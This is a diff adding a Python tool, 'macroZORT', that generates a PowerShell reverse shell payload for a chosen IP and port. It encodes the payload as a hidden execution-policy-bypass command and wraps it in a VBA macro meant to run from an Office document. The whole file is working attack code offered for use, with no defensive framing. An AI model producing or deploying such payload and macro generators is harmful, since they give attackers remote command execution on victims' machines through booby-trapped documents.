@@ -1,0 +1,78 @@
+#!/usr/bin/python3
+import os
+import sys
+import base64
+
+Black = '\033[1;30m'  # Black
+Red = '\033[1;31m'  # Red
+Green = '\033[1;32m'  # Green
+Yellow = '\033[1;33m'  # Yellow
+Blue = '\033[1;34m'  # Blue
+Purple = '\033[1;35m'  # Purple
+Cyan = '\033[1;36m'  # Cyan
+White = '\033[1;37m'  # White
+prompt = f'{Green}[{White}0x1337{Green}]──[{White}M4cr0Z0RT{Green}]\n' \
+         f'└─────►{White} '
+
+def clear():
+    os.system('clear')
+
+
+def banner():
+
+    print(f'''{Red}
+                                                           
+ _____ _____ _____ _____ _____     _____ _____ _____ _____ 
+|     |  _  |     | __  |     |___|__   |     | __  |_   _|
+| | | |     |   --|    -|  |  |___|   __|  |  |    -| | |  
+|_|_|_|__|__|_____|__|__|_____|   |_____|_____|__|__| |_|  
+                                        {Green}/ / / {White}B Y - K 3 R N E L - D E V {Green}\\ \\ \\{White}
+    ''')
+
+
+def generate_shellcode(ip, port):
+    global cmdline
+    payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+    payload = payload % (ip, port)
+    cmdline = "powershell -ep bypass -WindowStyle hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+    return f'{White}[{Red}+{White}] Shellcode output:\n{Green}{cmdline}'
+
+
+def generate_macro(shellcode):
+    n = 50
+    print(f'{White}[{Red}+{White}] Macros output:\n{Green}')
+    print(
+        'Sub DocumentOpening()\n\tDim Str As String')
+    for i in range(0, len(shellcode), n):
+        print("\tStr = str+" + '"' + shellcode[i:i + n] + '"')
+    print('\tCreateObject("Wscript.Shell").Run Str\nEnd sub')
+
+
+def helper():
+    clear()
+    banner()
+    print(f'{prompt}Usage:\n'
+          f'[+]For generate powershell payload:\n{White}./macroZORT generate <IP> <PORT>\n\n'
+          f'[+]For generate shellcode macros:\n./macroZORT macro_gen <IP> <PORT>')
+
+
+def main():
+    banner()
+
+
+if __name__ == '__main__':
+    main()
+    try:
+        mode = sys.argv[1]
+        if mode == 'generate':
+            (ip, port) = (sys.argv[2], int(sys.argv[3]))
+            print(generate_shellcode(ip, port))
+        elif mode == 'macro_gen':
+            (ip, port) = (sys.argv[2], int(sys.argv[3]))
+            generate_shellcode(ip, port)
+            generate_macro(cmdline)
+        else:
+            helper()
+
+    except:
+        helper()
